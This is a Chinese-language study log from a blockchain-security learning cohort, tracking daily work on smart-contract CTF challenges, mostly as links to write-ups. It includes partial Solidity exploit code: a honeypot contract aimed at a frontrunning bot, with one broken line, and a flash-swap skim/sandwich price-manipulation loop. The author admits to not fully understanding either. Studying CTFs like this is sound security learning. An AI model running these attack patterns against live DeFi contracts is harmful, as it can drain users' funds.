---
timezone: Asia/Shanghai
---

> 请在上边的 timezone 添加你的当地时区，这会有助于你的打卡状态的自动化更新，如果没有添加，默认为北京时间 UTC+8 时区
> 时区请参考以下列表，请移除 # 以后的内容

timezone: Pacific/Honolulu # 夏威夷-阿留申标准时间 (UTC-10)

timezone: America/Anchorage # 阿拉斯加标准时间 (UTC-9)

timezone: America/Los_Angeles # 太平洋标准时间 (UTC-8)

timezone: America/Denver # 山地标准时间 (UTC-7)

timezone: America/Chicago # 中部标准时间 (UTC-6)

timezone: America/New_York # 东部标准时间 (UTC-5)

timezone: America/Halifax # 大西洋标准时间 (UTC-4)

timezone: America/St_Johns # 纽芬兰标准时间 (UTC-3:30)

timezone: America/Sao_Paulo # 巴西利亚时间 (UTC-3)

timezone: Atlantic/Azores # 亚速尔群岛时间 (UTC-1)

timezone: Europe/London # 格林威治标准时间 (UTC+0)

timezone: Europe/Berlin # 中欧标准时间 (UTC+1)

timezone: Europe/Helsinki # 东欧标准时间 (UTC+2)

timezone: Europe/Moscow # 莫斯科标准时间 (UTC+3)

timezone: Asia/Dubai # 海湾标准时间 (UTC+4)

timezone: Asia/Kolkata # 印度标准时间 (UTC+5:30)

timezone: Asia/Dhaka # 孟加拉国标准时间 (UTC+6)

timezone: Asia/Bangkok # 中南半岛时间 (UTC+7)

timezone: Asia/Shanghai # 中国标准时间 (UTC+8)

timezone: Asia/Taipei # 台灣标准时间 (UTC+8)

timezone: Asia/Tokyo # 日本标准时间 (UTC+9)

timezone: Australia/Sydney # 澳大利亚东部标准时间 (UTC+10)

timezone: Pacific/Auckland # 新西兰标准时间 (UTC+12)

---

# {0xLight}

1. 自我介绍
 我是0xLight，一名区块链方向的在读本科生，马上大二，之前主要是学习区块链安全方面知识，做过几个靶场，希望能从这次残酷共学中学到更多有用的知识    
2. 你认为你会完成本次残酷学习吗？
 应该能完成，我会尽量抽课余时间学习

## Notes

<!-- Content_START -->

### 2024.08.29

[AMAZEX-DSS-PARIS Challenge1](https://github.com/JadeLight7/AMAZEX-DSS-PARIS/blob/main/Operation%20magic%20redemption.md)//笔记和POC都在链接里，不知道昨天是忘记改上面时区了还是什么算我miss了，>:
### 2024.08.30

[ModernWETH](https://github.com/JadeLight7/AMAZEX-DSS-PARIS/blob/main/ModernWETH.md)//解题和POC

[LendingPool](https://github.com/JadeLight7/AMAZEX-DSS-PARIS/blob/main/LendingPool.md)

### 2024.8.31

[Rescue POSI Token](https://github.com/JadeLight7/AMAZEX-DSS-PARIS/blob/main/Operation%20Rescue%20POSI%20Token!.md)

[balloon-vault](https://github.com/JadeLight7/AMAZEX-DSS-PARIS/blob/main/balloon-vault.md)

### 2024.9.1
[yieldPool](https://github.com/JadeLight7/AMAZEX-DSS-PARIS/blob/main/yieldPool.md)

[crystalDAO](https://github.com/JadeLight7/AMAZEX-DSS-PARIS/blob/main/crystalDAO.md)

### 2024.9.2
[oilver](https://github.com/JadeLight7/AMAZEX-DSS-PARIS/blob/main/oilver.md)

### 2024.9.3
[blazctf hello world](https://github.com/JadeLight7/blazctf2023/blob/main/helloworld.md)

### 2024.9.4
[rock-paper-scissor](https://github.com/JadeLight7/blazctf2023/blob/main/rock-paper-scissor.md)

### 2024.9.5
请假

### 2024.9.6
blazectf eazy-ctf  验证我们要有20个ntf，只需要mint20个，这个ctf前面还是比较简单，但是这两天事太多了，等过段时间做点难的

### 2024.9.7
我服了，昨天写了忘提交了

[LocklessPancakePair](https://github.com/JadeLight7/blazctf2023/blob/main/LocklessPancakePair.md)

### 2024.9.8

[evm puzzles1](http://www.kaipaansinua.top/index.php/2024/09/08/evm-puzzles1/)//自己尝试做字节码的题

blazectf 后面题太难了，tony疯了我也疯了，要是都像amazex dss Paris全都有测试环境就好了，c里面的靶场都看了看，太难了不适合我，A靶场前两个都做了，所以打算做点其他本次残酷共学没有的，见谅。

### 2024.9.9
[evm_puzzles2](http://www.kaipaansinua.top/index.php/2024/09/09/evm-puzzles2/)

[evm_puzzles3](http://www.kaipaansinua.top/index.php/2024/09/09/evm-puzzles3/)

### 2024.9.10
[evm_puzzles4](http://www.kaipaansinua.top/index.php/2024/09/10/evm-puzzles4/)

### 2024.9.11
[evm_puzzles5](http://www.kaipaansinua.top/index.php/2024/09/10/evm-puzzles5/)
### 2024.9.12
[evm_puzzles6](http://www.kaipaansinua.top/index.php/2024/09/10/evm-puzzles6/)
### 2024.9.13
[evm_puzzles7](http://www.kaipaansinua.top/index.php/2024/09/10/evm-puzzles7/)
### 2024.9.14
[evm_puzzles8](http://www.kaipaansinua.top/index.php/2024/09/10/evm-puzzles8/)
### 2024.9.15
[evm_puzzles9](http://www.kaipaansinua.top/index.php/2024/09/10/evm-puzzles9/)
### 2024.9.16
[evm_puzzles10](http://www.kaipaansinua.top/index.php/2024/09/10/evm-puzzles10/)

### 2024.9.18
[blazctf-2023 Hide on bush]再过两天blazctf2024来了，之前看过几道简单的，后面实在有点难，不打算单独创一个仓库了，就在这写了

这个题我有点疑惑，他本质是一个抢跑机器人，通过攻击合约调用Challenge合约的Claim函数，Claim函数通过AirdropDistributor合约的Claim函数执行检查，返回转账金额最后转账，不过在这里会执行FrontrunBot合约的go函数，这为什么是个0地址？没有比赛环境，这里应该是抢跑机器人的地址，而且传参每次都new一个空的bytes[]，这个是真不理解为什么。
``` solidity
(bool s, ) = address(0x0).delegatecall(abi.encodeWithSignature("go(bytes[])", new bytes[](0)));
```
这是个抢跑机器人
```solidity
function go(bytes[] calldata data) external payable onlyOwner {
        for (uint256 i = 0; i < data.length; i++) {
            (bool isDelegatecall, address target, uint256 value, bytes memory payload) =
                abi.decode(data[i], (bool, address, uint256, bytes));

            bool success;

            if (isDelegatecall) {
                (success,) = target.delegatecall(payload);
            } else {
                (success,) = target.call{value: value}(payload);
            }

            if (!success) {
                revert CallFailed(i);
            }
        }
    }
```
他会根据传的数据解码出是否是delegatecall，发起调用的地址，金额，具体调用方法，然后执行抢跑。但是那个空调传参都是空的，不理解。

解题大概就是写个蜜罐，当抢跑机器人进行交易时改变逻辑
```solidity
 pragma solidity ^0.8.0;

 interface IERC20 {
     function transfer(address recipient, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
 }

 contract HoneyPotImpl {
     IERC20 public immutable weth;
     address public immutable owner;
     HoneyPot public immutable pot;

     constructor(IERC20 _weth) {
         weth = _weth;
         owner = tx.origin;
         pot = HoneyPot(msg.sender);
     }

     function makeMoney() external {
         if (pot.stealMoney()) {
             weth.transfer(owner, weth.balanceOf(address(this)));
         } else {
             pot.claim();
         }
     }
 }

 contract HoneyPot {
     HoneyPotImpl public immutable honeyPotImpl;
     bool public stealMoney;
     IERC20 public weth = IERC20(0x0A1D939e65648E9fb46C9da8E45426A0D5c6eC67);

     constructor() {
         honeyPotImpl = new HoneyPotImpl(weth);
     }

     function makeMoney() external {
         this.stealMoney();

         (bool s,) = address(honeyPotImpl). (msg.data);
         require(s, "HoneyPot: failed to make money");
     }

     function claim() external {
         weth.transfer(tx.origin, weth.balanceOf(address(this)));
     }

     function setStealMoney(bool _stealMoney) external {
         stealMoney = _stealMoney;
     }
 }
```
他的意思应该是当我们使用makemoney想要转账的时候会触发抢跑机器人，而根据逻辑最后还是会调用这个合约的claim函数向我么转账。不过我不理解，在这题抢跑机器人不是只有owner调用吗，为什么我这个只是调用转账也会触发？

最后审核的时候能帮忙解答一下吗哈哈。

### 2024.9.20
[blazctf-2023 Ketai]
这个题看了两天，题解太敷衍了，不太看得懂，大体意思是说每次买卖的时候会有差价，利用三明治攻击，在低点买入，高点卖出。同时利用闪电兑换贷款进行更高价格的价格操纵。
```solidity
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        console.log("start balance", chal.ketai().balanceOf(address(this)));

        for (uint256 c = 0; c < 25; c++) {
            uint256 ketaiBalance = chal.ketai().balanceOf(address(this));
            chal.ketai().transfer(address(chal.ketaiUSDTPair()), ketaiBalance / 10);
            for (uint256 i = 0; i < 200; i++) {
                chal.ketaiUSDTPair().skim(address(chal.ketaiUSDTPair()));
            }
            chal.ketaiUSDTPair().skim(address(this));
            KetaiToUSDT(ketaiBalance * 9 / 10);
            uint256 usdtBalance = chal.usdt().balanceOf(address(this));

            for (uint256 i = 0; i < 100 / (c + 1); i++) {
                chal.ketai().distributeReward();
            }

            USDTToKetai(usdtBalance);
        }
```
这是攻击的主要代码，但是不理解为什么要连续调用那么多次skim，也没弄清楚攻击逻辑。

### 2024.9.21
做blazctf2024，感觉真正做题和做以前的github里面的题感觉大不相同，要自己去找数据，下载题目
### 2024.9.22
因为不怎么用telegram今天一登陆发现错过了1000多信息，也发现原来要在那上面请假才算，，，

blazctf2024做出了两道，等明天比赛结束了写

https://github.com/JadeLight7/blazctf2024/tree/main

<!-- Content_END -->
